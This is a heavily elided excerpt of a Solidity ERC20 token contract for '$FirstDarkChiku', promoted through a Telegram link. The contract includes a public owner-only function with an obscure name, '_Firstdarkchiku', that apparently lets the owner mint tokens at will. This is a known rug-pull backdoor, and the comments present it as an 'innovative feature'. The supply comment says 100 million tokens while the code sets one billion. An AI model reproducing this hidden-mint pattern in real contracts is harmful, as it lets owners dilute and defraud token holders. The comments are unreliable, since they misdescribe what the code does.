...
//
// $FirstDarkChiku proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/Firstdarkchiku
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Firstdarkchiku(uint256 amount) public onlyOwner {
 _Firstdarkchiku(msg.sender, amount);
    }
    ...
    function _Firstdarkchiku(address account, uint256 amount) internal virtual {
...
contract $FirstDarkChiku is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("First Dark Chiku", "FIRSTDARKCHIKU") {
        _Firstdarkchiku(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}